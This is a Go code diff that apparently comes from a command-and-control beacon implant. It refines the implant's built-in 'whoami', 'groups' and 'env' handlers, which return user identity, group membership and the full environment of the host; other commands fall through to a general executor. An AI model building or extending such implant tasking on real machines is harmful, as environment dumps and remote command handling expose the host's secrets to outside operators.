@@ -10,7 +10,8 @@ import (
 )
 
 // Built-in HTTP beacon commands (matched case-insensitively, whole string after trim — no extra args).
-// Implemented without shelling out so behavior is consistent on Windows, Linux, and Darwin.
+// These never use exec.Command or a shell: they use os/user and os.Environ() only (same idea as
+// `whoami` / `groups` / `env` on Unix, or listing process environment on Windows — not subprocesses).
 
 func builtinWhoami() (string, error) {
 	u, err := user.Current()
@@ -49,24 +50,37 @@ func builtinGroups() (string, error) {
 	return strings.Join(names, " ") + "\n", nil
 }
 
-// builtinEnvironment returns all environment variables as KEY=value lines (sorted by key=value string).
+// builtinEnvironment returns all environment variables as KEY=value lines (sorted), like `env` on Linux/macOS.
 func builtinEnvironment() (string, error) {
 	env := os.Environ()
 	sort.Strings(env)
 	return strings.Join(env, "\n") + "\n", nil
 }
 
+func normalizeBuiltinCommand(s string) string {
+	s = strings.TrimSpace(s)
+	s = strings.TrimPrefix(s, "\ufeff") // BOM from some JSON producers
+	return s
+}
+
 // runBuiltinHTTPCommand runs a built-in command when the token matches. If handled is false, use ExecuteCommand.
 func runBuiltinHTTPCommand(command string) (output string, err error, handled bool) {
-	s := strings.TrimSpace(command)
-	switch {
-	case strings.EqualFold(s, "whoami"):
+	s := normalizeBuiltinCommand(command)
+	if s == "" {
+		return "", nil, false
+	}
+	// Single-token only: do not treat "env -0" as builtin.
+	if len(strings.Fields(s)) != 1 {
+		return "", nil, false
+	}
+	switch strings.ToLower(s) {
+	case "whoami":
 		out, e := builtinWhoami()
 		return out, e, true
-	case strings.EqualFold(s, "groups"):
+	case "groups":
 		out, e := builtinGroups()
 		return out, e, true
-	case strings.EqualFold(s, "environment"):
+	case "environment", "env":
 		out, e := builtinEnvironment()
 		return out, e, true
 	default:
